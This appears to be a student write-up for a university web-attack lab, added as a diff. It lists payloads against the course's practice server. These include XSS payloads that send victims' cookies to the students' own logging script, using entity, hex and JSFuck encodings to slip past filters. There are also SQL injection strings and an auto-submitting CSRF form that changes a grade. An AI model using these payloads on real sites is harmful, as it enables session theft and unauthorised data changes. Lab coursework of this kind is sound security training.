@@ -1,0 +1,119 @@
+CS 342 Lab #2: Web Attack Lab
+Jocelyn Shiue, Cynthia Chen, Sherry Xu
+
+frontslash / [falls forward when read right to left]
+backslash \ [falls backwards]
+
+ssh jshiue@cs.wellesley.edu
+password hint: aren’t friends wonderful? they don’t like to wear caps.
+
+tail -f omnom.txt
+
+cookieEater.php in public_html
+
+Provides the payload you found (i.e., what you entered into the text box on our server)
+Provides a ~1 sentence intuition for how it works
+
+Please also include any accompanying files you created (e.g., your PHP script).
+
+Scenario #1:
+
+1. 2 points
+	Payload: <script> var image = new Image();  image.src = "http://cs.wellesley.edu/~jshiue/cookieEater.php?cookie=“ + document.cookie; </script>
+
+	Sentence: We gave Meowth an image. The source of this image was our malicious website which stole Meowth’s cookie. (authenticated=68e9927da7c041519acd0be69220e9c2c2d55c52)
+
+2. 2 points
+	Payload: <img src= 'gibberish.gif' onerror="var image = new Image();  image.src = 'http://cs.wellesley.edu/~jshiue/cookieEater.php?cookie=' + document.cookie">
+  to generate the following link : http://cs342.wellesley.edu/lab2/pmc/notsosimple.php?url=%3Cimg+src%3D+%27gibberish.gif%27+onerror%3D%22var+image+%3D+new+Image%28%29%3B++image.src+%3D+%27http%3A%2F%2Fcs.wellesley.edu%2F~jshiue%2FcookieEater.php%3Fcookie%3D%27+%2B+document.cookie%22%3E
+  which steals anyone who click's it's cookie.
+(authenticated=8bae6cfda67fdca45cc4cef3d0f68e49a043fea9) was the document.cookie of meowth
+  Sentence: Since 'script' was stripped, we instead used onerror to pass in javascript code.
+
+3. 3 points [Filters 'script', 'style', 'on', and ' ' (space)]
+  Payload: <iframe/src="javascr&#105pt:&#32var&#32image=new&#32Image();&#32image.src='http://cs.wellesley.edu/~jshiue/cookieEater.php?cookie='&#32+&#32document.cookie">
+(authenticated=7eb5382d6f179b91ad740d0e54da8a7630a8e480)
+	Sentence: We used iframe so we could use the source attribute to run javascript of our mallicious code. We changed i in script to be the computer interpretable version.
+ i is &#105
+ space is &#32
+
+4. 4 points [Filters 'document', '(', ')', '<', '>']
+< is 60
+> is 62
+o is 111
+( is 40
+) is 41
+  Payload: "src= 'gibberish.gif' onerror="var image = new Image&#40&#41;;  image.src = 'http://cs.wellesley.edu/~jshiue/cookieEater.php?cookie=' + d&#111cument.cookie;
+	(authenticated=e7060baff0b813cff0161065f39ac1e23c2b4459)
+  Sentence: The way the website was written, the users's input was read as part of an img alt text. So we closed the quote and used onerror as it works in an image tag. We also replaced all the characters to be computer interpretable version.
+
+5. 2 points [Filters '<', '>']
+	Payload: ";var image = new Image();  image.src = 'http://cs.wellesley.edu/~jshiue/cookieEater.php?cookie=' + document.cookie;"
+	authenticated=0dad7a6be163e02b0009285366d57412c83fdad6
+	Sentence: The user's input is imbedded in a msg string that is nested in a script tag. We exit the msg string using " and then we execute the same thing as the first scenario.
+
+6. 3 points [Filters s/[()<>+]//g (that's a regular expression that removes all the characters in the square
+brackets from the input string)]
+( is 40
+) is 41
+	Payload: var image = new Image\x28\x29.src = 'https://cs.wellesley.edu/~jshiue/cookieEater.php?cookie=' \x2b document.cookie;" ; alert = eval; "
+	Sentence: We replaced the characters that were filtered out with their hex equivalents. We also overwrite alert to be eval so that it executes the string that is put into the program as a msg variable.
+
+<script> var image = new Image();  image.src = “https://cs.wellesley.edu/~jshiue/cookieEater.php?cookie=" + document.cookie; </script>
+7. Filters s/[bcdfihzjrst<>]//ig (similar to above, but ignores case for letters as well)
+	Payload: asdf", x = "va\x72 \x69mage = new \x49mage(); \x69mage.\x73\x72\x63='\x68\x74\x74p://\x63\x73.welle\x73ley.e\x64u/~\x63\x63\x68en16/\x63ook\x69e\x45a\x74e\x72.p\x68p?\x63ook\x69e=' + \x64o\x63umen\x74.\x63ook\x69e;", y = eval(x), v = "
+	Sentence: This is a similar scenario as problem 6, but we had to replace more characters with their ascii equivalents.
+
+8. Filters s/[0-9a-z]//gi (removes all numbers and all letters from input string)
+	Payload:
+	(Step 1) Check this payload steals cookies "; {{{{{var image = new Image(); image.src="http://cs.wellesley.edu/~jshiue/cookieEater.php?cookie=" + document.cookie; var leftover = ""}}}}} + "
+	Where everything in {{{{{ …… }}}}} is encoded in JSFuck (http://www.jsfuck.com/)
+
+	(Step 2) Create a form that is hosted on our own server that makes that above post request
+	http://cs.wellesley.edu/~jshiue/wbft.html
+
+	Sentence:make a website and that has a script in JSFuck which sends a post request to change the cookie.
+
+Scenario #2
+1. 2 points
+	Payload: ' OR 1=1; --
+	Sentence: By inferencing that the server was expecting a username input, we closed the expectant user. We then injected code that was always true followed by a way to comment out the rest of the database's code.
+2. 5 points (optional)
+Payload:
+(Step 1) qwerty1', (select * from (select name from sql2 where approved = true limit 1) as x), 1);
+
+(Step 2) qwerty1
+This gives us back “Hi qwerty1, unfortunately the request you submitted on Chicken Husky was not approved.”
+
+(Step 3) Chicken Husky
+This is the name of an approved person
+
+Sentence: If the name you enter is not in the database, the server performs an insert command. We use sql injection in the insert command, so instead of adding the time a name was entered, we get the name of a person who is approved.
+
+3. 1 point (optional)
+
+Scenario #3
+1. 5 points
+	Payload: http://cs.wellesley.edu/~jshiue/panda.html
+	The following is what is located in the panda.html file:
+<html>
+<head>
+        <title> PAndA </title>
+</head>
+
+<body>
+<form action="http://cs342.wellesley.edu/lab2/supersecuregradingsystem/?action=update-grade" method="post" name="hi" class="form-signin" role="form">
+        <div style="width: 50%; margin: auto; padding-top: 5px">
+        <input name="groups" type="text" value = chen&jerry class="form-control" placeholder="Group" required="" autofocus="">
+        <input name="grade" type="password" value = 123 class="form-control" placeholder="Grade % (i.e. 0)" required="">
+        <button class="btn btn-lg btn-primary btn-block" type="submit">Update Grade</button>
+        </div>
+              </form>
+
+<script>
+document.hi.submit();
+</script>
+</body>
+
+	Sentence: We created a malicious website that performs a post request to update a groups grade which is  hosted on our local wellesley cs account.
+2. 1 point (optional)
